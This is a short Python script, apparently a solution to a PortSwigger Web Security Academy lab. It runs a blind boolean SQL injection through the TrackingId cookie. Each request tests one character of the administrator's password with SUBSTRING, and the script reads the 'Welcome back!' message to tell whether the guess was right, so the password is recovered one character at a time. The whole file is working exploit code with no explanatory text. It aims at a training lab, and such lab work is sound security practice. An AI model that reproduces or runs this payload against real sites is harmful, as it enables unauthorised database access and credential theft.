from bs4 import BeautifulSoup
import string
import requests

URL = "https://0a4900c604bf5d29816c71dd00f100dc.web-security-academy.net"
TRACKING_ID = "1BbwCX1WIreq7sL7"
SESSION = "d95hzH0rw5iNTXjtTSTOVsgb5Ph1QLVU"

PAYLOAD01 = "' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), "
PAYLOAD02 = ", 1) = '"
CONDITION = "<div>Welcome back!</div>"

PRINTABLE_STR = string.digits + string.ascii_lowercase
FLAG = ""

for i in range(1000):
    for j in range(len(PRINTABLE_STR)):
        PAYLOAD = PAYLOAD01 + str(i + 1) + PAYLOAD02 + PRINTABLE_STR[j]

        print(PAYLOAD)

        COOKIE = {"TrackingId" : TRACKING_ID + PAYLOAD, "session" : SESSION}
    
        resp = requests.get(URL, cookies=COOKIE)

        if resp.text.find(CONDITION) > -1:
            print("Password["+str(i)+"] 'administrator' is " + PRINTABLE_STR[j])
            FLAG += PRINTABLE_STR[j]
            IS_FLAG = True
            break
    
    if j + 1 == len(PRINTABLE_STR):
        break

print('FLAG is ' + FLAG)